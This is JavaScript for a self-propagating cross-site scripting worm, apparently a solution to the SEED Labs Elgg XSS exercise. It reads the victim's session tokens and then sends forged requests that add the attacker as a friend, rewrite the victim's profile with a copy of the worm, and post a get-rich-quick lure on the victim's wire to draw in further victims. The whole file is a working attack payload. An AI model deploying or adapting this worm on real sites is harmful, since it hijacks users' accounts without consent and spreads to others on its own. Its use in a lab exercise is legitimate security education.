<script id="worm">
   window.onload = function() {


       /* everything we need about the victim */
      
       var guid = elgg.session.user.guid;
       var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
       var token = '&__elgg_token='+elgg.security.token.__elgg_token;
      
  


       /**** task4.1: make the victim friend ............59 is attacker's guid***/
       var sendurl = 'http://www.seed-server.com/action/friends/add?friend=59'+ts+token+ts+token;


       if(guid != 59) {
           var Ajax = null;
           Ajax = new XMLHttpRequest();
           Ajax.open('GET', sendurl, true);
           Ajax.setRequestHeader('Host', 'www.seed-server.com');
           Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
           Ajax.send();
       }
      


       /* replicating worm  */


       var headerTag = '<script id=\"worm\" type=\"text/javascript\">';
       var jsCode = document.getElementById("worm").innerHTML;
       var footerTag = '</'+'script>';
       var wormCode = encodeURIComponent(headerTag+jsCode+footerTag);
       //alert(jsCode);




       /* ****task4.2: edit the victim's profile*********** */
       sendurl = 'http://www.seed-server.com/action/profile/edit';
       var name = elgg.session.user.name;


       var content = token+ts+'&name='+name;
       var randomString ='task4';
       /*the wormCode should be in the description of the victim for further propagation. now the victim will act like an attacker*/
       content += '&description='+wormCode+'&accesslevel%5Bdescription%5D=1';
       content += '&briefdescription='+randomString+'&accesslevel%5Bbriefdescription%5D=1'
       content += '&location='+randomString+'&accesslevel%5Blocation%5D=1'
       content += '&interests='+randomString+'&accesslevel%5Binterests%5D=1'
       content += '&skills='+randomString+'&accesslevel%5Bskills%5D=1'
       content += '&contactemail='+randomString+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
       content += '&phone='+randomString+'&accesslevel%5Bphone%5D=1';
       content += '&mobile='+randomString+'&accesslevel%5Bmobile%5D=1';
       content += '&website=http%3A%2F%2Fwww.'+randomString+'.com&accesslevel%5Bwebsite%5D=1';
       content += '&twitter='+randomString+'&accesslevel%5Btwitter%5D=1';
       content += '&guid='+guid;
       //console.log(content);


       /*not affect the attacker and attack only others*/
       if(guid != 59) {
           var Ajax = null;
           Ajax = new XMLHttpRequest();
           Ajax.open('POST', sendurl, true);
           Ajax.setRequestHeader('Host', 'www.seed-server.com');
           Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
           Ajax.send(content);
       }


       /* accessing username of the current user */
       var username = elgg.session.user.username;


       /* task4.3: post on wire so that others visit the profile of the victim to propagate more........................*/
       sendurl = 'http://www.seed-server.com/action/thewire/add';
       content = token+ts+'&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now+http%3A%2F%2Fwww.seed-server.com%2Fprofile%2F'+username+'.';
      
       /* creating and sending Ajax request to post on the wire on behalf of the victim */
       if(guid != 59) {
           var Ajax = null;
           Ajax = new XMLHttpRequest();
           Ajax.open('POST', sendurl, true);
           Ajax.setRequestHeader('Host', 'www.seed-server.com');
           Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
           Ajax.send(content);
       }
   }
</script>
